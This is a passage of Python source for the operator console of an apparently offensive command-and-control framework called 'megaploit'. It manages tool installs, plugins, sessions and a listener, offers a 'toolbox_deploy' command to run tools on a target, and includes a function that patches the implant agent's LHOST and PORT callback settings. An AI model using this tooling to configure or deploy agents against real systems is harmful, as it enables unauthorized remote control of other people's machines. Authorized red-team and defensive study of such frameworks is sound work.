            print(f"       {_c(t.repo, _GREY)}")
            if t.tags:
                print(f"       {' '.join(_c(tag, _DIM) for tag in t.tags)}")
        print()

    def _toolbox_info(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox info <name>"))
            return
        t = _tool_registry.get(args[0])
        if not t:
            print(err(f"Tool '{args[0]}' not found."))
            return
        run_cmd_str = " ".join(t.run_cmd) if t.run_cmd else _c("(auto)", _GREY)
        dot = _c("● installed", _GREEN) if t.is_installed else _c("○ missing", _RED)
        print()
        print(_box_top(f"Tool: {t.name}"))
        print(_box_row(_kv("Name",         _c(t.name, _CYAN, _BOLD))))
        print(_box_row(_kv("Status",       dot)))
        print(_box_row(_kv("Language",     _c(t.lang, _YELLOW))))
        print(_box_row(_kv("Repository",   _c(t.repo, _GREY))))
        print(_box_row(_kv("Description",  t.description[:58])))
        print(_box_row(_kv("Entry-point",  _c(t.entry, _WHITE))))
        print(_box_row(_kv("Run command",  _c(run_cmd_str, _DIM))))
        print(_box_row(_kv("Path",         _c(t.path, _GREY))))
        print(_box_row(_kv("Installed at", t.installed_at or "unknown")))
        if t.tags:
            print(_box_row(_kv("Tags", "  ".join(_c(tag, _CYAN) for tag in t.tags))))
        print(_box_bot())
        print()
        print(f"  {_c('Session usage:', _BOLD, _WHITE)}")
        print(f"    {_c('toolbox_run', _CYAN)} {t.name} {_c('[args]', _GREY)}")
        print(f"    {_c('toolbox_deploy', _CYAN)} {t.name} {_c('[args]', _GREY)}")
        print()

    def _toolbox_remove(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox remove <name>"))
            return
        name = args[0]
        print()
        print(_c(f"  ⚠  Remove '{name}' and delete all its files?", _YELLOW, _BOLD))
        confirm = input(_c("     Type YES to confirm: ", _YELLOW)).strip()
        if confirm.lower() != "yes":
            print(warn("  Cancelled."))
            return
        try:
            _installer.uninstall(name, progress=print)
            print(ok(f"'{name}' removed."))
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_update(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox update <name>"))
            return
        name = args[0]
        print(info(f"Updating {_c(name, _CYAN)}…"))
        try:
            with _Spinner(f"Pulling & rebuilding {name}…"):
                _installer.update(name, progress=lambda l: None)
            print(ok(f"'{name}' updated."))
            if self._updater:
                self._updater.check_now()
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_update_all(self) -> None:
        tools = _tool_registry.all()
        if not tools:
            print(info("No tools installed."))
            return
        any_ok = False
        for t in tools:
            if not t.is_installed:
                print(warn(f"  Skipping '{t.name}' — directory not found"))
                continue
            try:
                with _Spinner(f"Updating {t.name}…"):
                    _installer.update(t.name, progress=lambda l: None)
                print(ok(f"'{t.name}' updated."))
                any_ok = True
            except RuntimeError as e:
                print(err(f"  {t.name}: {e}"))
        if any_ok and self._updater:
            self._updater.check_now()

    def _toolbox_check_updates(self) -> None:
        print(info("Checking for updates…"))
        if self._updater:
            self._updater.check_now()
            time.sleep(2)
            for note in self._updater.drain():
                print(note)
        else:
            print(warn("Update checker not running (git not on PATH?)."))

    def _toolbox_rebuild(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox rebuild <name>"))
            return
        name = args[0]
        t = _tool_registry.get(name)
        if not t:
            print(err(f"Tool '{name}' not found."))
            return
        if not t.is_installed:
            print(err(f"Tool directory missing: {t.path}"))
            return
        print(info(f"Rebuilding '{name}'…"))
        try:
            with _Spinner(f"Building {name}…"):
                t.run_cmd  = _installer.build(t.path, name, t.lang, progress=lambda l: None)
                t.entry    = _installer.detect_entry(t.path, name, t.lang)
            _tool_registry.add(t)
            print(ok(f"'{name}' rebuilt."))
            print(f"  {_kv('Entry',   _c(t.entry,          _WHITE))}")
            print(f"  {_kv('Command', _c(' '.join(t.run_cmd), _GREY))}")
        except RuntimeError as e:
            print(err(str(e)))

    def _toolbox_set_entry(self, args: list[str]) -> None:
        if len(args) < 2:
            print(err("Usage: toolbox set-entry <name> <entry_path>"))
            return
        name, entry = args[0], args[1]
        t = _tool_registry.get(name)
        if not t:
            print(err(f"Tool '{name}' not found."))
            return
        t.entry = entry
        _tool_registry.add(t)
        print(ok(f"Entry-point for '{name}'  →  {_c(entry, _CYAN)}"))

    def _toolbox_help(self) -> None:
        def _r(cmd: str, desc: str) -> str:
            return f"  {_c(cmd, _CYAN):<{36 + 9}}  {_c(desc, _GREY)}"

        lines = [
            "",
            _section("toolbox sub-commands"),
            "",
            _r("toolbox install <url> <name>",  "Clone & install from GitHub"),
            _r("toolbox list",                  "Show all installed tools"),
            _r("toolbox search <query>",        "Search by name / tag / description"),
            _r("toolbox info <name>",           "Show tool details & usage"),
            _r("toolbox update <name>",         "Pull latest changes (git pull + rebuild)"),
            _r("toolbox update-all",            "Update every installed tool at once"),
            _r("toolbox check-updates",         "Check now for available updates"),
            _r("toolbox rebuild <name>",        "Re-run build step (no git pull)"),
            _r("toolbox remove <name>",         "Uninstall a tool"),
            _r("toolbox set-entry <name> <p>",  "Override the entry-point path"),
            "",
            _section("Inside a session"),
            "",
            _r("toolbox_run <name> [args]",     "Run tool locally (operator side)"),
            _r("toolbox_deploy <name> [args]",  "Upload & run tool on target"),
            "",
        ]
        print("\n".join(lines))

    # ---------------------------------------------------------------
    # Plugins command
    # ---------------------------------------------------------------

    def _cmd_plugins(self, args: list[str]) -> None:
        sub = args[0].lower() if args else "list"
        if sub in ("list", "ls"):
            self._plugins_list()
        elif sub == "reload":
            self._plugins_reload()
        elif sub == "info":
            self._plugins_info(args[1:])
        else:
            self._plugins_info(args)

    def _plugins_list(self) -> None:
        plugins = _plugin_loader.plugins()
        if not plugins:
            print(info("No plugins loaded."))
            print(info(f"Drop a .toml file into  {_c('plugins/', _CYAN)}  then run  {_c('plugins reload', _CYAN)}"))
            return
        print()
        hdr = f"  {'PLUGIN':<20} {'VER':<10} {'CMDS':<6} DESCRIPTION"
        print(_c(hdr, _BOLD, _WHITE))
        print(_rule("─"))
        for p in plugins:
            ncmds = str(len(p.commands))
            desc  = p.description[:42] + ("…" if len(p.description) > 42 else "")
            print(f"  {_c('◆', _MAGENTA)} {_c(p.name, _CYAN):<{19 + 9}} {p.version:<10} {ncmds:<6} {_c(desc, _GREY)}")
        print()
        all_cmd_names = _plugin_loader.all_command_names()
        if all_cmd_names:
            print(_section("Plugin commands"))
            for cname in all_cmd_names:
                pc  = _plugin_loader.get_command(cname)
                tag = _c("  [!]", _RED) if pc.dangerous else ""
                print(f"    {_c(cname, _GREEN):<{28 + 9}}  {_c(pc.description, _GREY)}{tag}")
            print()

    def _plugins_reload(self) -> None:
        print(info("Reloading plugins…"))
        loaded, _errs = _plugin_loader.load_all()
        if loaded:
            print(ok(f"Loaded {loaded} plugin(s)."))
        else:
            print(info(f"No plugins found in  {_c('plugins/', _CYAN)}"))
        for fname, msg in _plugin_loader.errors():
            print(warn(f"  Error in '{fname}': {msg}"))

    def _plugins_info(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: plugins info <name>"))
            return
        p = _plugin_loader.get(args[0])
        if not p:
            print(err(f"Plugin '{args[0]}' not loaded."))
            return
        print()
        print(_box_top(f"Plugin: {p.name}"))
        print(_box_row(_kv("Name",        _c(p.name, _CYAN, _BOLD))))
        print(_box_row(_kv("Version",     p.version)))
        print(_box_row(_kv("Author",      p.author or "(unknown)")))
        print(_box_row(_kv("Description", p.description[:58])))
        print(_box_row(_kv("Source",      _c(p.source_path, _GREY))))
        print(_box_bot())
        if p.commands:
            print(_section("Commands"))
            for pc in p.commands:
                tag      = _c("  [dangerous]", _RED) if pc.dangerous else ""
                kind_col = _c(f"[{pc.kind}]", _YELLOW)
                print(f"  {_c(pc.usage or pc.name, _GREEN):<{30 + 9}}  {kind_col}  {_c(pc.description, _GREY)}{tag}")
        print()

    # ---------------------------------------------------------------
    # Shutdown
    # ---------------------------------------------------------------

    def _shutdown(self) -> None:
        print()
        print(_rule("─", color=_RED))
        print(info("Shutting down…"))
        if self._updater:
            self._updater.stop()
        if self._listener:
            self._listener.stop()
        with self._sessions_lock:
            for sess in self._sessions.values():
                sess.close()
        print(ok("Goodbye."))
        print(_rule("─", color=_RED))


# ---------------------------------------------------------------------------
# Options display helper
# ---------------------------------------------------------------------------

def _show_options(console: Console) -> None:
    print()
    print(_c(f"  {'Option':<12}  Value", _BOLD, _WHITE))
    print(_rule("─", width=40))
    for key, val in (
        ("lhost",       console.lhost or "(not set)"),
        ("port",        str(console.port)),
        ("cert",        console.cert or "(none)"),
        ("key",         console.key_file or "(none)"),
        ("auto_update", "on" if console.auto_update else "off"),
    ):
        val_col = _c(val, _WHITE) if val not in ("(not set)", "(none)", "off") else _c(val, _DIM)
        print(f"  {_c(key, _YELLOW):<{12 + 9}}  {val_col}")
    print()


# ---------------------------------------------------------------------------
# Agent patcher
# ---------------------------------------------------------------------------

def _patch_agent(lhost: str, port: int, use_tls: bool = False) -> None:
    _patch_connection_module(lhost, port, use_tls)
    print(ok(f"agent.py patched  —  LHOST={_c(lhost, _CYAN)}  PORT={_c(str(port), _CYAN)}  TLS={_c(str(use_tls), _CYAN)}"))


def _patch_connection_module(lhost: str, port: int, use_tls: bool) -> None:
    path = os.path.join("megaploit", "agent", "connection.py")
    try:
        with open(path, "r", encoding="utf-8") as f:
            src = f.read()
        src = re.sub(r'^LHOST\s*=.*$',   f'LHOST   = "{lhost}"',             src, flags=re.MULTILINE)
        src = re.sub(r'^PORT\s*=.*$',    f'PORT    = {port}',                src, flags=re.MULTILINE)
        src = re.sub(r'^USE_TLS\s*=.*$', f'USE_TLS = {use_tls}   # patched', src, flags=re.MULTILINE)
        with open(path, "w", encoding="utf-8") as f:
            f.write(src)
    except IOError as e:
        print(err(f"Patch failed: {e}"))
